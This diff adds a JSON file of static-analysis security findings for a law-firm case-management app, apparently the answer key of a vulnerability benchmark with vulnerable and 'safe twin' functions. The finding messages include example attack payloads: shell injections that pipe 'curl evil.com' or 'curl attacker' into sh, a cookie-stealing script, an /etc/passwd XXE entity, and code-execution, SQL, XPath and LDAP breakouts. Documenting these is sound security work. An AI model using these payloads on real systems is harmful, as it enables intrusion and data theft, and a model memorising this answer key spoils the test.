@@ -1,0 +1,780 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.code-injection-header",
+      "path": "app/lib/billing.server.ts",
+      "start": {
+        "line": 10,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "computeAgingProjection() builds a `new Function('matter', 'return (' + expression + ');')` from a caller-supplied expression string and executes it. It is called from app/routes/api.matters.tsx:44 with `agingExpression` taken directly from the `x-aging-expression` request header (any caller holding a valid Bearer API key, scoped only to 'matters:read documents:read', can supply this header). This allows full server-side arbitrary JavaScript execution (e.g. `require('child_process').execSync(...)` via constructor tricks), i.e. remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-queryrawunsafe",
+      "path": "app/lib/audit.server.ts",
+      "start": {
+        "line": 27,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchAuditTrailAdvanced() interpolates the caller-supplied `term` and `entityType` strings directly into a raw SQL string passed to prisma.$queryRawUnsafe. Reachable from app/routes/app.admin.audit.tsx (GET params `advancedTerm`/`advancedEntityType`, default mode). A value like `' UNION SELECT ... --` breaks out of the ILIKE/equality literals, allowing SQL injection against the AuditLog table (and, depending on DB permissions, broader data access).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "app/lib/filing-conversion.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 70,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderFilingCopy() builds a shell command string with `execSync(`pandoc \"${sourcePath}\" -o \"${targetPath}\" --to=${format}`)`, where `format` is unvalidated (unlike the safe twin renderFilingPackage, there is no allowlist check). It is called from app/routes/app.documents.$documentId.convert.tsx:18 with `format` taken straight from the `?format=` query string of a GET request any authenticated user with document access can issue, e.g. `?format=pdf;curl evil.com|sh` to achieve OS command injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-spawn-shell",
+      "path": "app/lib/filing-conversion.server.ts",
+      "start": {
+        "line": 31,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 39,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderExhibitQuickLook() runs `spawn(`pandoc \"${sourcePath}\" -o \"${targetPath}\" --to=${declaredExtension}`, { shell: true })`. It is called from app/routes/app.documents.$documentId.tsx:90 with `declaredExtension` derived from the uploaded file's own filename (declaredScanExtension takes everything after the last '.'). An uploaded file named e.g. `a.$(curl attacker/x|sh)` results in shell command injection when the version-upload preview is generated. The safe twin renderExhibitQuickLookSafe fixes this via an extension allowlist and shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.external-entity-resolution",
+      "path": "app/lib/docket-feed.server.ts",
+      "start": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "inlineDeclaredEntities() parses `<!ENTITY name SYSTEM \"...\">` declarations from a fetched docket feed body and resolves them by reading local files via `file://` URIs (readFile) or fetching arbitrary URLs, then splices the result into the document. This is invoked by ingestCourtStatusFeed() (docket-feed.server.ts:55-61), which is called from app/routes/app.matters.$matterId.timeline.tsx:61 (`sync-status-feed` intent) with a fully attacker-supplied `feedUrl`. A malicious feed server can respond with a DOCTYPE declaring `<!ENTITY x SYSTEM \"file:///etc/passwd\">` to exfiltrate arbitrary local files back into the audit log, or SSRF to internal services.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unrestricted-fetch",
+      "path": "app/lib/exhibit-intake.server.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importExhibitFromUrl() calls `fetch(sourceUrl)` with no host/protocol allowlist and writes the response body under public/exhibits. It is called from app/routes/app.matters.$matterId.timeline.tsx:84 with `docketUrl` taken directly from a POST form field submitted by any user who can edit the matter. This allows server-side request forgery against internal/cloud-metadata hosts (e.g. `http://169.254.169.254/...`) and publishes the fetched content under a predictable public path. The safe twin importExhibitFromApprovedDocket restricts to an HTTPS host allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.unrestricted-fetch-verified-feed",
+      "path": "app/lib/docket-feed.server.ts",
+      "start": {
+        "line": 69,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 70,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ingestCourtStatusFeedVerified() still calls `fetch(feedUrl)` on a fully attacker-supplied URL before performing its DOCTYPE check. Reachable from app/routes/app.matters.$matterId.docket-crossref.tsx:32 (`feedUrl` POST field). While this variant blocks XXE, it does not restrict the request target, so it remains usable for SSRF against internal hosts.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.prototype-pollution.deep-merge",
+      "path": "app/lib/workflow.ts",
+      "start": {
+        "line": 93,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 115,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "deepMergeRules() recursively assigns `target[key] = value` (or recurses into `target[key]`) for every key of the attacker-controlled `source` object with no denylist for `__proto__`/`constructor`/`prototype`. It backs applyMatterAutomationRules(), called from app/routes/app.matters.$matterId.tsx:524-528 with `overrides = JSON.parse(rawOverrides)` taken from a POST form field any matter editor can submit (`update-automation-rules` intent). Submitting `{\"__proto__\":{\"polluted\":true}}` pollutes Object.prototype process-wide. The safe twin applyMatterAutomationRulesSafely uses an explicit key allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-full-access-tier",
+      "path": "app/lib/permissions.server.ts",
+      "start": {
+        "line": 119,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 126,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePortalCopyRequest() runs `prisma.document.findUnique({ where: { id: documentId } })` with no matter/visibility scoping whenever `accessTier === \"full\"`. It is called from app/routes/app.portal.tsx:151 (`request-privileged-copy` intent) where `accessTier` is a plain POST field a CLIENT-role portal user fully controls (the UI only offers 'standard'/'full', but nothing server-side stops any other value from being sent, and 'full' itself already bypasses scoping). This lets a client-portal user retrieve any document in the system by id, including privileged/internal documents belonging to other matters.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.prisma-where-clause-injection",
+      "path": "app/lib/permissions.server.ts",
+      "start": {
+        "line": 56,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 66,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findConflictCandidates() parses the `conflictFilter` query parameter with `JSON.parse(raw)` and spreads the result directly into a Prisma `where` clause (`{ ...criteria, id: { not: excludeClientId } }`). It is called from app/routes/app.matters.$matterId.tsx:119 on every matter-detail page load for any non-CLIENT user. An attacker-controlled where object can inject arbitrary Prisma filter operators/relations (e.g. reaching into related fields) to widen or manipulate the query beyond the intended conflict-check scope, exposing client records that should not match.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.unvalidated-update-data",
+      "path": "app/lib/permissions.server.ts",
+      "start": {
+        "line": 185,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 190,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordConflictClearance() spreads an entire attacker-supplied `submission` object (built from `Object.fromEntries(formData)` in app/routes/app.matters.$matterId.conflicts.tsx:85-88, with only `intent`/`memoLabel` removed) directly into `prisma.client.update({ data: { ...submission, ... } })` with no field allowlist or schema validation. An ATTORNEY/FIRM_ADMIN submitting extra hidden form fields (e.g. `portalUserId`, `status`, `email`) can overwrite arbitrary Client columns beyond the intended conflict-clearance fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.json-patch-to-orm-update",
+      "path": "app/lib/exhibit-intake.server.ts",
+      "start": {
+        "line": 84,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 90,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyExhibitManifestPatch() does `const patch = JSON.parse(manifestJson); return prisma.document.update({ where: { id: documentId }, data: patch })` with no schema/allowlist check. Called from app/routes/app.documents.$documentId.tsx:148 (`sync-exhibit-manifest` intent) with `manifestJson` a raw textarea value from any user who can manage the document. Submitting `{\"visibility\":\"PUBLIC_FILING\",\"matterId\":\"...\"}` lets the caller silently change a document's visibility/privilege classification or reparent it to another matter. The safe twin applyExhibitManifestPatchValidated restricts the patch to a strict Zod schema.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.eval-in-template-merge",
+      "path": "app/lib/templates.server.ts",
+      "start": {
+        "line": 31,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 42,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "compileMergeWording() evaluates every `{{expression}}` block in `wordingSource` with `new Function(\"fields\", \"with (fields) { return (\" + expression + \"); }\")(context)`. It is called from renderCustomCoverLetterHtml(), which app/routes/app.reports.tsx:218-219 feeds with `wording` taken directly from the `letterWording` query parameter (`export=custom_letter_html`) for any FIRM_ADMIN/ATTORNEY/PARALEGAL. A value like `{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}` executes arbitrary server-side JavaScript.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-html-response",
+      "path": "app/lib/notice.server.ts",
+      "start": {
+        "line": 74,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 80,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderStandardReminderLetterHtml() merges the caller-supplied `note` into the STANDARD_REMINDER_WORDING template via compileMergeWording() and interpolates the result unescaped into `<p>${body}</p>`. app/routes/app.reports.tsx:235-236 (`export=reminder_letter_html`) passes the raw `note` query parameter (only length-capped to 500 chars, no HTML escaping) into this function and returns the HTML as `text/html`. A value like `<script>document.location='//evil/?c='+document.cookie</script>` executes in the browser of anyone opening the generated letter link.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-site Scripting"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-matter-fields",
+      "path": "app/lib/notice.server.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCourtNoticeHtml() interpolates `matter.title` and `matter.summary` directly into an HTML response with no escaping (contrast with the escaped renderMatterCoverLetterHtml twin). Reachable via app/routes/app.reports.tsx:163-166 (`export=court_notice_html`). Since matter title/summary are free-text fields set at matter creation/edit (app/routes/app.matters.new.tsx, app.matters.$matterId.edit.tsx) by any ATTORNEY/FIRM_ADMIN, a crafted title such as `</h2><script>...</script>` produces stored XSS served to anyone who opens the court-notice export for that matter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.insecure-randomness-share-code",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 101,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 103,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateCounselHandoffCode() derives a matter share code from `Math.random().toString(36)`, a non-cryptographic PRNG. It is used in app/routes/app.matters.$matterId.tsx:393 (`create-matter-share-link` intent) to mint a code embedded in a shareable URL (`?share=${shareCode}`) intended to grant an outside co-counsel firm access to a matter. Math.random() output is predictable, letting an attacker brute-force or predict valid share codes. The secure twin generateCounselHandoffCodeSecure() uses crypto.randomInt.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.missing-security-attributes",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 120,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 123,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "withCounselHandoffSession() sets `Set-Cookie: lcm_counsel_session=${handoffCode}.${matterId}; Path=/app/matters/${matterId}` with no HttpOnly, Secure, or SameSite attributes. Used from app/routes/app.matters.$matterId.tsx:469 (`start-counsel-review-session` intent) to hand a co-counsel reviewer a session token. Without HttpOnly the token is readable by any script (XSS-adjacent exposure); without Secure it can be sent over plaintext HTTP; without SameSite it is attached to cross-site requests. The secure twin withCounselHandoffSessionSecure sets all three plus Max-Age.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.insufficient-token-expiration",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 168,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 180,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveMatterReviewLink() verifies the HMAC signature of a co-counsel review token but never checks the embedded `exp` timestamp, despite issueMatterReviewLink() advertising a bounded review window (default 30 minutes). Reachable via app/routes/matters.$matterId.review.tsx:19, which is an unauthenticated route (no requireUser call) gated only by this token check. A review link therefore grants indefinite read access to a matter's details/deadlines, contradicting the advertised time-boxed sharing model. The enforced twin resolveMatterReviewLinkEnforced checks `payload.exp`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.redos-unescaped-regex-from-input",
+      "path": "app/routes/app.matters.$matterId.tsx",
+      "start": {
+        "line": 82,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 98,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The loader builds `new RegExp(`^${matter.matterNumber}:${deadlineReference}$`, \"i\")` where `deadlineReference` comes verbatim from the `?deadlineReference=` query parameter of any authenticated user, then tests it against every deadline record. Regex metacharacters in `deadlineReference` are not escaped, so a crafted value (e.g. nested quantifiers like `(a+)+$`) can produce catastrophic backtracking against attacker-influenced input, and the unescaped injection also lets a caller widen or bypass the intended exact-match filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1333: Inefficient Regular Expression Complexity"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-filter-injection",
+      "path": "app/lib/directory.server.ts",
+      "start": {
+        "line": 56,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 60,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() builds the filter `(cn=*${searchTerm}*)` without escaping metacharacters (contrast with escapeDirectoryFilter used by the verifyGroupAccess twin), then hands it to a filter parser that splits on parenthesized clauses. Reachable from app/routes/app.admin.directory.tsx:12 via the `term` query parameter. A value such as `x)(cn=*` breaks out of the intended single clause and can inject additional filter clauses, letting a caller manipulate which directory entries match beyond the intended substring search.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-predicate-injection",
+      "path": "app/lib/docket-index.server.ts",
+      "start": {
+        "line": 53,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchDocketCrossReferences() builds `/dockets/record[@section='${sectionCode}']` by direct string interpolation, with no escaping of quote characters (contrast with escapeXPathString used by the searchDocketCrossReferencesSafe twin). Reachable from app/routes/app.matters.$matterId.docket-crossref.tsx:18 via the `sectionCode` query parameter/cached cookie. A value like `x' or 'a'='a` closes the intended clause and injects an always-true clause (the predicate parser splits on ' or '), returning every docket record across all matters regardless of section, bypassing the intended firm-wide section filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-live-api-key",
+      "path": "app/lib/ledger-gateway.server.ts",
+      "start": {
+        "line": 1,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`retainerGatewayKey` is a hardcoded live-looking payment-processor API key (`rk_live_...` prefix) committed directly in source and used as a Bearer token in chargeRetainerTopUp() to call the firm's trust-accounting payment processor. Anyone with source access (including this repository's history) has a working production credential to the payments API, unlike the sibling `ledgerFlowKey` which is correctly sourced from `process.env.LEDGERFLOW_API_KEY`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.transport.cleartext-api-key-in-url",
+      "path": "app/lib/calendar-sync.server.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "pushDeadlineToCourtCalendar() sends the calendar API key as a plaintext query-string parameter over `http://` (not https): `http://${host}/api/events?api_key=${apiKey}&...`. Called from app/routes/app.deadlines.tsx:62 (`sync-court-calendar` intent). Sending the credential unencrypted exposes it to network eavesdroppers, and placing it in a URL means it is likely to be logged by proxies/servers. The sibling pushDeadlineToPracticeCalendar correctly uses HTTPS with an Authorization header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.caller-controlled-bcrypt-cost",
+      "path": "app/lib/security.server.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "hashPasswordForPartnerSync() passes a caller-supplied `syncRounds` straight into `bcrypt.hash(password, syncRounds)`. Called from app/routes/app.admin.integrations.tsx:96-100 (`provision-partner-account` intent) where `syncRounds = Number(formData.get(\"syncRounds\")) || 4` is a plain form field defaulting to 4 (versus the fixed, safe `BCRYPT_ROUNDS = 12` used by the secure hashPassword twin). A caller can request an arbitrarily low work factor (even 1), producing a weakly-hashed password for the newly provisioned partner account.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.stack-trace-in-response",
+      "path": "app/routes/app.reports.tsx",
+      "start": {
+        "line": 43,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 67,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildAgingDiagnosticsResponse() returns `error.stack` in the JSON response body whenever the caller-controlled `verbosity` query parameter equals `\"full\"` (`export=aging_diagnostics&weighting=<bad>&verbosity=full`, lines 354-357). This exposes internal file paths and call-stack details to any FIRM_ADMIN/ATTORNEY/PARALEGAL who supplies an unrecognized weighting id, aiding further attack reconnaissance. The sibling buildMatterStatusDiagnosticsResponse only logs server-side and returns a generic message.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.stack-trace-in-retainer-response",
+      "path": "app/routes/app.matters.$matterId.retainer.tsx",
+      "start": {
+        "line": 17,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "submitRetainerTopUp() returns `error.stack` as `detail`, which the action handler at line 138-140 forwards in the JSON response and the component renders inside a `<pre>` (line 171) whenever the retainer-payment gateway call fails. This leaks internal stack traces (file paths, call structure) to any ATTORNEY/FIRM_ADMIN whenever the upstream payment call errors.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.padding-oracle-cbc-error-distinction",
+      "path": "app/lib/retainer-memo.server.ts",
+      "start": {
+        "line": 21,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 34,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openRetainerMemoLegacy() decrypts with unauthenticated AES-256-CBC and distinguishes a padding failure (`\"bad decrypt\"` -> \"Retainer memo padding is invalid.\") from other decryption failures. app/routes/app.matters.$matterId.retainer.tsx:103-106 (`confirm-retainer-memo` intent) propagates this distinction to the HTTP response (400 for padding errors vs 422 otherwise). This observable padding-oracle side channel lets an attacker who can submit crafted `sealedMemo`/`memoIv` values run a Vaudenay-style padding-oracle attack to decrypt or forge ciphertext without knowing the key. The sealed twin openRetainerMemoSealed uses AES-GCM (AEAD) and collapses every failure into one generic error.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.uncontrolled-recursion",
+      "path": "app/lib/permissions.server.ts",
+      "start": {
+        "line": 74,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 85,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandRelatedPartyNetwork() recurses over every client whose `conflictSummary` contains the current client id, with no depth limit and no cap on the number of records fetched per level (contrast with expandRelatedPartyNetworkBounded's `MAX_RELATED_PARTY_DEPTH`/`take: 25`). Reachable from app/routes/app.matters.$matterId.conflicts.tsx:43 (`expand-related-parties` intent). A dense or long conflict-note chain (which a paralegal could construct through normal free-text conflict notes) triggers an unbounded chain of sequential database lookups, causing excessive resource consumption / denial of service.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-674: Uncontrolled Recursion"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.overly-permissive-frame-ancestors",
+      "path": "app/lib/security.server.ts",
+      "start": {
+        "line": 48,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyEmbeddablePartnerHeaders() deletes X-Frame-Options and sets `Content-Security-Policy: frame-ancestors https://${embedPartnerHost}` using a caller-supplied host with no allowlist check (contrast with the trustedEmbedPartners check in applySecurePartnerHeaders). Reachable from app/routes/app.reports.tsx:176-177 via the `embedPartner` query parameter on the `court_notice_html` export. An attacker can set `embedPartner=attacker.example` to permit their own origin to iframe the generated court-notice page, enabling clickjacking against firm staff.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-allow-any",
+      "path": "app/lib/security.server.ts",
+      "start": {
+        "line": 93,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 99,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyIntegrationCorsHeaders() sets `Access-Control-Allow-Origin` to whatever `Origin` header the caller sends, with no allowlist (contrast with trustedIntegrationOrigins used by applyIntegrationCorsHeadersSafe). Used in app/routes/api.matters.tsx:47 on the Bearer-API-key-protected matters feed. Any web page can call this endpoint cross-origin using a victim's leaked/stolen API key from their own browser context and have the response readable, defeating the same-origin policy protection this endpoint would otherwise get.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.unvalidated-header-redirect",
+      "path": "app/lib/security.server.ts",
+      "start": {
+        "line": 65,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 67,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveEmbedReturnDestination() returns the caller-supplied `returnUrlHeader` verbatim as a redirect target whenever it is non-empty, with no host validation (contrast with the trustedEmbedPartners allowlist check in the safe twin resolveEmbedReturnDestinationSafe). Used in app/routes/app.portal.tsx:129 (`close-embedded-session` intent), where the value comes from the `x-redirect-url` request header a CLIENT-role user fully controls, and the result is passed to `redirect()`, producing an open redirect to any external URL (e.g. a phishing page).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
